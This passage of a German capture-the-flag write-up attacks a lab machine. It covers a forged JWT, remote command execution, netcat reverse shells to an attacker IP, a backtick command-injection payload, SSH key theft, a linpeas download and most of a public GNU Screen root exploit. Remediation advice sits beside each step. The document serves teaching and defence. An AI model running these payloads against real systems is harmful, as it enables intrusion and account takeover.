+ :: URL              : http://192.168.2.122:3000/execute
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/objects.txt
+ :: Header           : Content-Type: application/json, Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0
+ :: Data             : {"FUZZ":"id"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Filer            : Response words: 54
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 43ms]
+    * FUZZ: command
+
+:: Progress: [3132/3132] :: Job [1/1] :: 147 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                 <strong>Analyse:</strong> Es werden `curl`-Anfragen mit dem gefälschten Admin-JWT und dem korrekten Parameter `command` gesendet, um Befehle (`id`, `cat /etc/passwd`, `grep bash /etc/passwd`) auszuführen.
+             </p>
+            <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Befehlsausführung ist erfolgreich!
+                 *   `id`: Zeigt `uid=33(www-data)`. RCE als Webserver-Benutzer ist bestätigt.
+                 *   `cat /etc/passwd` & `grep bash /etc/passwd`: Zeigen die Benutzerliste. Relevant ist der Benutzer `doro` mit `/bin/bash`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE-Schwachstelle, um eine Reverse Shell zu erhalten und interaktiven Zugriff als `www-data` zu bekommen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Die Anwendung erlaubt authentifizierten Admins (und durch das schwache JWT-Secret jedem, der den Token fälscht) die Ausführung beliebiger Befehle als `www-data`. Der Code in `app.js`, der den `command`-Parameter verarbeitet und `exec` oder `spawn` aufruft, muss dringend überarbeitet werden, um Command Injection zu verhindern. Validieren und bereinigen Sie die Eingaben rigoros oder vermeiden Sie die direkte Befehlsausführung. Beheben Sie die JWT-Schwachstelle (starkes Secret).
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"command":"id"}'</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"command":"cat /etc/passwd"}'</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/opt/login-app:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
+doro:x:1000:1000:,,,:/home/doro:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"command":"grep bash /etc/passwd"}'</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+doro:x:1000:1000:,,,:/home/doro:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine Reverse Shell wird initiiert. Ein `netcat`-Listener wird auf dem Angreifer-System auf Port 9001 gestartet. Dann wird über die RCE-Schwachstelle der Befehl `nc -e /bin/bash [Angreifer-IP] 9001` ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Reverse Shell ist erfolgreich. Der Listener meldet eine eingehende Verbindung vom Zielsystem. Der Angreifer hat nun eine interaktive Shell als `www-data`. Initialer Zugriff erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die erhaltene Shell (z.B. mit Python PTY, `stty raw -echo`), um die Benutzerfreundlichkeit zu verbessern. Beginnen Sie dann mit der lokalen Enumeration als `www-data`, um Wege zur Rechteausweitung (wahrscheinlich über den Benutzer `doro`) zu finden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener starten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- RCE auslösen -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.122:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMjkwNDUxfQ.5Mtaa6a9lMlGVjYgw6eiDs9n4aXKmrXeljztDq7xup0" -d '{"command":"nc -e /bin/bash 192.168.2.130 9001"}'</span></div>
+                     <!-- Keine Ausgabe von curl, aber Verbindung kommt beim Listener an -->
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener empfängt Verbindung -->
+                     <pre>
+connect to [192.168.2.130] from (UNKNOWN) [192.168.2.122] 55696
+                     </pre>
+                     <!-- Hier beginnt die interaktive Shell als www-data -->
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die erhaltene Reverse Shell wird mit Standardmethoden stabilisiert (`python3 -c 'import pty...'`, `export TERM=xterm`, `stty raw -echo; fg`).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Shell ist nun interaktiver und unterstützt z.B. Tab-Vervollständigung und das Löschen von Zeichen korrekt.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- In der Reverse Shell -->
+                     <div class="prompt no-kali-prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">export TERM=xterm</span></div>
+                     <!-- Auf Angreifer-System: Ctrl+Z, dann stty -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# ^Z
+zsh: suspended  nc -lvnp 9001</div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                     </pre>
+                     <!-- Zurück in der (jetzt stabilisierten) Reverse Shell -->
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">reset</span></div> <!-- Optional: Terminal zurücksetzen -->
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ </div>
+                 </div>
+            </div>
+        </section>
+
+        <section id="privesc-doro">
+            <h2>Privilege Escalation (www-data -> doro via Command Injection)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als `www-data` wird das aktuelle Verzeichnis (`/opt/login-app`) und die Bash-Historie untersucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `ls -la` zeigt die Dateien der Node.js-Anwendung. Die `.bash_history` ist entscheidend: Sie zeigt, dass jemand (vermutlich `www-data` oder ein anderer Benutzer mit Zugriff auf diese Shell) versucht hat, `/usr/bin/python3 /home/doro/tools.py --ping` mittels `sudo -u doro` auszuführen. Dies bestätigt die Vermutung aus der `/etc/passwd`-Analyse und gibt den Pfad zur nächsten Eskalation vor: `www-data` kann das Python-Skript `tools.py` als Benutzer `doro` ausführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/home/doro/tools.py` auf Schwachstellen, insbesondere im Zusammenhang mit der `--ping`-Option. Führen Sie `sudo -l` als `www-data` aus, um die Berechtigung zu bestätigen (obwohl die History ein starker Hinweis ist).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">ls -la</span></div>
+                     <pre>
+total 124
+drwxr-xr-x   3 www-data www-data  4096 Apr  6 19:26 .
+drwxr-xr-x   3 root     root      4096 Mar  1 06:25 ..
+-rw-r--r--   1 www-data www-data  3271 Mar  1 21:10 app.js
+-rw-r--r--   1 www-data www-data  3169 Mar  2 19:44 app.js.save
+-rw-------   1 www-data www-data   153 Apr  6 19:43 .bash_history
+drwxr-xr-x 127 www-data www-data  4096 Mar  1 21:10 node_modules
+-rw-r--r--   1 www-data www-data   399 Mar  1 21:10 package.json
+-rw-r--r--   1 www-data www-data 95944 Mar  1 21:10 package-lock.json
+                     </pre>
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">cat .bash_history</span></div>
+                     <pre>
+clear
+cd /home/doro/
+clear
+sudo -l
+/usr/bin/python3 /home/doro/tools.py --ping
+sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
+clear
+crontab -l
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Das Python-Skript `/home/doro/tools.py` wird analysiert. Zuerst wird die Hilfe aufgerufen (`--help`), dann der Quellcode (`cat`) und die Berechtigungen (`ls -la`) angezeigt.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   `--help`: Zeigt die Optionen `--ping` und `--traceroute`.
+                 *   `cat`: Der Code der `ping()`-Funktion ist entscheidend. Sie nimmt eine IP-Adresse als Input, prüft auf einige verbotene Zeichen (`&`, `;`, `(`, `)`, `|`, `>`, `<`, `*`, `?`), aber **nicht** auf Backticks (`) oder `$()`! Dann führt sie `os.system('ping -c 2 ' + ip_address)` aus. Dies ist eine klare Command Injection-Schwachstelle. Da `www-data` dieses Skript als `doro` ausführen kann, können Befehle als `doro` injiziert werden.
+                 *   `ls -la`: Das Skript gehört `root:root` und ist nur für Root schreibbar, was aber irrelevant ist, da es über `sudo -u doro` ausgeführt wird.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutzen Sie die Command Injection aus. Führen Sie `sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping` aus. Geben Sie bei der Abfrage "Enter an IP address:" einen Payload ein, der Backticks oder `$()` verwendet, um eine Reverse Shell zu starten (z.B. `` `nc -e /bin/bash [Angreifer-IP] [Port]` ``). Starten Sie zuvor einen Listener auf dem Angreifer-System.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Das Python-Skript muss dringend überarbeitet werden. Verwenden Sie niemals `os.system` mit Benutzereingaben. Nutzen Sie sicherere Module wie `subprocess` und übergeben Sie Argumente als Liste, nicht als String, um Shell-Interpretation zu vermeiden. Die Blacklist ist unzureichend. Validieren Sie IP-Adressen korrekt. Entfernen Sie die unsichere `sudo`-Regel, die `www-data` erlaubt, dieses Skript als `doro` auszuführen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">sudo -u doro /usr/bin/python3 /home/doro/tools.py --help</span></div>
+                     <pre>
+Invalid option.
+Usage: python3 network_tool.py <option>
+Options:
+--ping           Ping an IP address
+--traceroute     Perform a traceroute on an IP address
+                     </pre>
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">cat /home/doro/tools.py</span></div>
+                     <pre>
+import os
+import sys
+
+def main():
+    if len(sys.argv) < 2:
+        print_help()
+        return
+
+    option = sys.argv[1]
+    if option == "--ping":
+        ping()
+    elif option == "--traceroute":
+        traceroute_ip()
+    else:
+        print("Invalid option.")
+        print_help()
+
+def print_help():
+    print("Usage: python3 network_tool.py <option>")
+    print("Options:")
+    print("--ping           Ping an IP address")
+    print("--traceroute     Perform a traceroute on an IP address")
+
+def ping():
+    ip_address = input("Enter an IP address: ")
+
+    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
+    for char in forbidden_chars:
+        if char in ip_address:
+            print("Forbidden character found: {}".format(char))
+            sys.exit(1)
+
+    os.system('ping -c 2 ' + ip_address) # !!! COMMAND INJECTION !!!
+
+def traceroute_ip():
+    ip_address = input("Enter an IP address: ")
+
+    if not is_valid_ip(ip_address):
+        print("Invalid IP address.")
+        return
+
+    traceroute_command = "traceroute {}".format(ip_address)
+    os.system(traceroute_command)
+
+def is_valid_ip(ip_address):
+    octets = ip_address.split(".")
+    if len(octets) != 4:
+        return False
+    for octet in octets:
+        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
+            return False
+    return True
+
+if __name__ == "__main__":
+    main()
+                     </pre>
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">ls -la /home/doro/tools.py</span></div>
+                     <pre>-rw-r--r-- 1 root root 1380 Mar  7 08:41 /home/doro/tools.py</pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Weitere Enumerationsbefehle werden ausgeführt: SUID-Dateien und Netzwerk-Sockets.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   SUID-Dateien: Zeigt Standard-Binaries und `/usr/bin/screen`. Die Version ist wichtig (LinPEAS findet später 4.5.0).
+                *   `ss`: Bestätigt SSH (22), Node.js (3000) und MySQL (3306 auf localhost).
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Command Injection in `tools.py` ist der klarste Weg zu `doro`. Behalten Sie die `screen`-Version für die Root-Eskalation im Hinterkopf.
+             </p>
+             <!-- find SUID -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   412370     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   420932    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
+   395793     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+   391773     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+   391769     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   395426     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+   391770     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   395267     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   391772     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   439943   1744 -rwsr-sr-x   1 root     root        1785104 Mar  3 07:29 /usr/bin/screen # Vulnerable Version!
+   439794    180 -rwsr-xr-x   1 root     root         182600 Jan 14 14:29 /usr/bin/sudo
+   395795     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+                     </pre>
+                 </div>
+             </div>
+             <!-- ss -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:(("sshd",pid=433,fd=3))
+LISTEN    0         511                0.0.0.0:3000             0.0.0.0:*        users:(("node",pid=414,fd=18))
+LISTEN    0         80               127.0.0.1:3306             0.0.0.0:*        users:(("mysqld",pid=489,fd=30))
+LISTEN    0         128                   [::]:22                  [::]:*        users:(("sshd",pid=433,fd=4))
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die Command Injection-Schwachstelle in `tools.py` wird ausgenutzt.
+                 1.  Ein `netcat`-Listener wird auf dem Angreifer-System auf Port 4444 gestartet.
+                 2.  Das Python-Skript wird über `sudo -u doro` ausgeführt.
+                 3.  Bei der Aufforderung "Enter an IP address:" wird der Payload `` `nc -e /bin/bash 192.168.2.130 4444` `` eingegeben. Die Backticks bewirken, dass der `nc`-Befehl von der Shell ausgeführt wird, bevor `ping` versucht, ihn als IP zu interpretieren.
+                 4.  Der Listener empfängt die Verbindung. Die Shell wird stabilisiert.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Eskalation zu `doro` ist erfolgreich! Der Angreifer hat nun eine interaktive Shell als Benutzer `doro`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Wechseln Sie ins Home-Verzeichnis von `doro`, suchen Sie nach der User-Flag und weiteren Hinweisen für die Root-Eskalation. Nutzen Sie die bereits bekannte Information über die verwundbare `screen`-Version.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener starten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Exploit ausführen -->
+                     <div class="prompt no-kali-prompt">www-data@aurora:/opt/login-app$ <span class="command">sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping</span></div>
+                     <pre>Enter an IP address: <span class="command">`nc -e /bin/bash 192.168.2.130 4444`</span></pre>
+                     <!-- Keine weitere Ausgabe hier, Verbindung geht zum Listener -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Listener empfängt Verbindung -->
+                      <pre>
+connect to [192.168.2.130] from (UNKNOWN) [192.168.2.122] 43702
+                      </pre>
+                      <!-- Shell Stabilisierung -->
+                      <div class="prompt no-kali-prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                      <div class="prompt no-kali-prompt">doro@aurora:/opt/login-app$ <span class="command">export TERM=xterm</span></div>
+                      <div class="prompt no-kali-prompt">doro@aurora:/opt/login-app$ <span class="command"># (Ctrl+Z; stty raw -echo; fg auf Angreiferseite)</span></div>
+                      <div class="prompt no-kali-prompt">doro@aurora:/opt/login-app$ </div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (doro -> root via Screen Exploit)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `doro` wird das Home-Verzeichnis untersucht und die User-Flag gefunden. Außerdem wird ein SSH-Schlüsselpaar (`id_rsa`, `id_rsa.pub`) entdeckt.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die User-Flag `<span class="password">ccd839df5504a7ace407b5aeca436e81</span>` wird erfolgreich gelesen. Das Vorhandensein eines SSH-Schlüssels ist interessant. Durch Umbenennen von `id_rsa.pub` in `authorized_keys` kann sich der Angreifer (der den privaten Schlüssel `id_rsa` nun besitzt) per SSH als `doro` anmelden, was eine stabilere Verbindung ermöglicht als die Reverse Shell.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Kopieren Sie den privaten Schlüssel `id_rsa` auf Ihre Angreifer-Maschine. Benennen Sie `id_rsa.pub` auf dem Ziel zu `authorized_keys` um. Melden Sie sich per SSH als `doro` an. Fahren Sie dann mit der Root-Eskalation fort, wahrscheinlich über die bekannte `screen`-Schwachstelle.
+             </p>
+            <!-- Home Verzeichnis & User Flag -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">doro@aurora:/opt/login-app$ <span class="command">cd ~</span></div>
+                     <div class="prompt no-kali-prompt">doro@aurora:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 36
+drwxr-xr-x 4 doro doro 4096 Mar  8 19:38 .
+drwxr-xr-x 3 root root 4096 Mar  6 19:24 ..
+lrwxrwxrwx 1 root root    9 Mar  3 18:33 .bash_history -> /dev/null
+-rw-r--r-- 1 doro doro  220 Mar  3 18:27 .bash_logout
+-rw-r--r-- 1 doro doro 3526 Mar  3 18:27 .bashrc
+drwxr-xr-x 3 doro doro 4096 Mar  4 09:39 .local
+-rw-r--r-- 1 doro doro  807 Mar  3 18:27 .profile
+drwx------ 2 doro doro 4096 Mar  4 09:41 .ssh
+-rw-r--r-- 1 root root 1380 Mar  7 08:41 tools.py
+-rwx------ 1 doro doro   33 Mar  3 18:28 user.txt
+                     </pre>
+                     <div class="prompt no-kali-prompt">doro@aurora:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">ccd839df5504a7ace407b5aeca436e81</span></pre>
+                 </div>
+             </div>
+             <!-- SSH Key finden und vorbereiten -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">doro@aurora:~$ <span class="command">cat .ssh/id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+# ... (Rest des Schlüssels) ...
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                      <div class="prompt no-kali-prompt">doro@aurora:~$ <span class="command">cd .ssh</span></div>
+                      <div class="prompt no-kali-prompt">doro@aurora:~/.ssh$ <span class="command">ls -la</span></div>
+                      <pre>
+total 16
+drwx------ 2 doro doro 4096 Mar  4 09:41 .
+drwxr-xr-x 4 doro doro 4096 Mar  8 19:38 ..
+-rw------- 1 doro doro 2602 Mar  4 09:41 id_rsa
+-rw-r--r-- 1 doro doro  565 Mar  4 09:41 id_rsa.pub
+                      </pre>
+                      <div class="prompt no-kali-prompt">doro@aurora:~/.ssh$ <span class="command">mv id_rsa.pub authorized_keys</span></div>
+                  </div>
+              </div>
+              <!-- SSH Login als doro -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <!-- Auf Angreifer-System (Annahme: id_rsa wurde als id_rsa_doro gespeichert) -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id_rsa_doro</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh doro@aurora.hmv -i id_rsa_doro</span></div>
+                      <pre>
+Linux aurora.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+# ... (Login Banner) ...
+                      </pre>
+                      <div class="prompt no-kali-prompt">doro@aurora:~$ </div>
+                  </div>
+              </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `doro` wird das Enumerationsskript `linpeas.sh` heruntergeladen, ausführbar gemacht und ausgeführt. LinPEAS findet die SUID-Datei `/usr/bin/screen` und hebt sie hervor, was auf eine bekannte Schwachstelle hindeutet (GNU Screen 4.5.0). Ein bekannter Exploit für diese Version (CVE-2017-5229), der `ld.so.preload` missbraucht, wird in eine Datei `exploit.sh` kopiert, ausführbar gemacht und ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> LinPEAS identifiziert korrekt die potenziell verwundbare `screen`-Version. Der verwendete Exploit-Code ist ein bekannter Public Exploit für diese Schwachstelle. Der Exploit funktioniert wie erwartet: Er erstellt eine Bibliothek (`libhax.so`) und eine Shell-Datei (`rootshell`), manipuliert `/etc/ld.so.preload` über eine `screen`-Funktion, um die Bibliothek beim nächsten Start eines Programms zu laden. Die Bibliothek setzt dann das SUID-Bit auf `/tmp/rootshell`. Der anschließende Aufruf von `/tmp/rootshell` führt zu einer Root-Shell. Der Befehl `id` bestätigt `uid=0(root)`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff erfolgreich erlangt! Suchen und lesen Sie die Root-Flag (oft in `/root/root.txt`).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Die verwendete `screen`-Version ist veraltet und verwundbar. Aktualisieren Sie `screen` dringend auf eine gepatchte Version oder entfernen Sie das SUID-Bit (`chmod u-s /usr/bin/screen`), falls SUID nicht benötigt wird. Überprüfen Sie das System auf Kompromittierungen.
+             </p>
+             <!-- Linpeas -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System: HTTP Server starten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">python3 -m http.server 8001</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</pre>
+                     <!-- Auf Zielsystem (als doro) -->
+                     <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">wget http://192.168.2.130:8001/linpeas.sh</span></div>
+                     <pre>
+--2023-05-05 15:53:38--  http://192.168.2.130:8001/linpeas.sh
+Connecting to 192.168.2.130:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 827827 (808K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh              100%[=============================>] 808.42K  --.-KB/s    in 0.01s
+
+2023-05-05 15:53:38 (66.5 MB/s) - ‘linpeas.sh’ saved [827827/827827]
+                     </pre>
+                     <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">chmod +x linpeas.sh</span></div>
+                     <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">./linpeas.sh</span></div>
+                     <pre>
+# ... (Linpeas Output) ...
+[+] Files with capabilities (limited entries)
+# ...
+[+] Setuid files
+# ...
+-rwsr-sr-x 1 root root 1.8M Mar  3 07:29 /usr/bin/screen # Highlighted by LinPEAS
+# ... (Weitere SUID Dateien) ...
+# ... (Ende Linpeas Output) ...
+                     </pre>
+                 </div>
+             </div>
+              <!-- Screen Exploit -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">vi exploit.sh</span></div>
+                      <pre>
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
